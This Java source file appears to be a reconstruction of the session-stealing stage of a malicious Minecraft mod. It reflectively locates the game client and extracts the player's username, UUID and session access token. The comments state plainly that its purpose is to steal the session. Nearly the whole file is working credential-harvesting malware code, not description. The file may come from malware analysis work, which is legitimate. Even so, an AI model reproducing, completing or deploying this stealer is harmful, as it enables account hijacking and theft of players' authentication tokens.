package silentnet.stage1;

import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.lang.reflect.Modifier;
import java.util.Set;

/**
 * Reconstructed from net.fabric.endQddej.
 *
 * The original does not link against Minecraft. It locates the client class by
 * name, then walks methods and fields reflectively to steal the session. Three
 * separate entry points are provided because the loader calls them at different
 * places.
 *
 * Candidate class names (both Mojang-mapped and intermediary/Yarn):
 *   net.minecraft.class_310
 *   net.minecraft.client.Minecraft
 *   net.minecraft.client.MinecraftClient
 *
 * Client holder:
 *   static getInstance() / method_1551(), or static field instance / field_1700
 *
 * Session object on the client:
 *   getSession() / getUser() / method_1548(), or field session / user / field_1726
 *
 * Value on the session object:
 *   username:    getUsername() / getName() / method_1676(), or field username / name / field_1982
 *   uuid:        getProfileId() / getUuid() / getUuidOrNull() / method_44717(),
 *                or field uuid / field_1985
 *   accessToken: getAccessToken() / method_1674(), or field accessToken / field_1983
 */
public final class SessionHarvester {
    private static final String[] CLIENT_CLASSES = {
            "net.minecraft.class_310",
            "net.minecraft.client.Minecraft",
            "net.minecraft.client.MinecraftClient"
    };

    private static final Set<String> SESSION_TYPES = Set.of("Session", "User", "SessionUser");
    private static final Set<String> USERNAME_TYPES = Set.of("Session", "User");
    private static final Set<String> UUID_TYPES = Set.of("SessionUser", "User");
    private static final Set<String> TOKEN_TYPES = Set.of("Session", "User");

    private SessionHarvester() {
    }

    public static String username() {
        try {
            Object client = findClient();
            if (client == null) {
                return null;
            }
            Object session = findSession(client, USERNAME_TYPES, false);
            if (session == null) {
                return null;
            }
            return readString(session,
                    Set.of("getUsername", "getName", "method_1676"),
                    Set.of("username", "name", "field_1982"));
        } catch (RuntimeException e) {
            return null;
        }
    }

    public static String uuid() {
        try {
            Object client = findClient();
            if (client == null) {
                return null;
            }
            Object session = findSession(client, UUID_TYPES, true);
            if (session == null) {
                return null;
            }
            return readString(session,
                    Set.of("getProfileId", "getUuid", "getUuidOrNull", "method_44717"),
                    Set.of("uuid", "field_1985"));
        } catch (RuntimeException e) {
            return null;
        }
    }

    public static String accessToken() {
        try {
            Object client = findClient();
            if (client == null) {
                return null;
            }
            Object session = findSession(client, TOKEN_TYPES, false);
            if (session == null) {
                return null;
            }
            return readString(session,
                    Set.of("getAccessToken", "method_1674"),
                    Set.of("accessToken", "field_1983"));
        } catch (RuntimeException e) {
            return null;
        }
    }

    private static Object findClient() {
        for (String className : CLIENT_CLASSES) {
            Class<?> type;
            try {
                type = Class.forName(className);
            } catch (ClassNotFoundException e) {
                continue;
            }

            for (Method method : type.getDeclaredMethods()) {
                if (!Modifier.isStatic(method.getModifiers())
                        || method.getParameterCount() != 0) {
                    continue;
                }
                boolean nameMatch = method.getName().equals("getInstance")
                        || method.getName().equals("method_1551");
                if (!nameMatch && method.getReturnType() != type) {
                    continue;
                }
                try {
                    method.setAccessible(true);
                    Object value = method.invoke(null);
                    if (value != null) {
                        return value;
                    }
                } catch (ReflectiveOperationException | RuntimeException ignored) {
                    // try the next candidate
                }
            }

            for (Field field : type.getDeclaredFields()) {
                if (!Modifier.isStatic(field.getModifiers())
                        || field.getType() != type) {
                    continue;
                }
                if (!field.getName().equals("instance")
                        && !field.getName().equals("field_1700")) {
                    continue;
                }
                try {
                    field.setAccessible(true);
                    Object value = field.get(null);
                    if (value != null) {
                        return value;
                    }
                } catch (ReflectiveOperationException | RuntimeException ignored) {
                    // try the next candidate
                }
            }
        }
        return null;
    }

    /**
     * @param acceptedTypes simple return type names accepted in addition to the
     *                      explicit method names. The original was deliberately
     *                      loose here.
     */
    private static Object findSession(Object client, Set<String> acceptedTypes,
                                      boolean requireTypeForMethod1548) {
        for (Method method : client.getClass().getMethods()) {
            if (method.getParameterCount() != 0
                    || Modifier.isStatic(method.getModifiers())) {
                continue;
            }
            boolean typeMatch = acceptedTypes.contains(
                    method.getReturnType().getSimpleName());
            boolean nameMatch = method.getName().equals("getSession")
                    || method.getName().equals("getUser")
                    || (method.getName().equals("method_1548")
                    && (!requireTypeForMethod1548 || typeMatch));
            if (!nameMatch && !typeMatch) {
                continue;
            }
            try {
                method.setAccessible(true);
                Object value = method.invoke(client);
                if (value != null) {
                    return value;
                }
            } catch (ReflectiveOperationException | RuntimeException ignored) {
                // try the next candidate
            }
        }

        for (Field field : client.getClass().getDeclaredFields()) {
            if (Modifier.isStatic(field.getModifiers())) {
                continue;
            }
            if (!field.getName().equals("session")
                    && !field.getName().equals("user")
                    && !field.getName().equals("field_1726")) {
                continue;
            }
            try {
                field.setAccessible(true);
                Object value = field.get(client);
                if (value != null) {
                    return value;
                }
            } catch (ReflectiveOperationException | RuntimeException ignored) {
                // try the next candidate
            }
        }
        return null;
    }

    private static String readString(Object holder, Set<String> methodNames,
                                     Set<String> fieldNames) {
        for (Method method : holder.getClass().getMethods()) {
            if (method.getParameterCount() != 0
                    || Modifier.isStatic(method.getModifiers())) {
                continue;
            }
            if (!methodNames.contains(method.getName())) {
                continue;
            }
            try {
                method.setAccessible(true);
                Object value = method.invoke(holder);
                if (value != null) {
                    return value.toString();
                }
            } catch (ReflectiveOperationException | RuntimeException ignored) {
                // try the next candidate
            }
        }

        for (Field field : holder.getClass().getDeclaredFields()) {
            if (Modifier.isStatic(field.getModifiers())) {
                continue;
            }
            if (!fieldNames.contains(field.getName())) {
                continue;
            }
            try {
                field.setAccessible(true);
                Object value = field.get(holder);
                if (value != null) {
                    return value.toString();
                }
            } catch (ReflectiveOperationException | RuntimeException ignored) {
                // try the next candidate
            }
        }
        return null;
    }
}
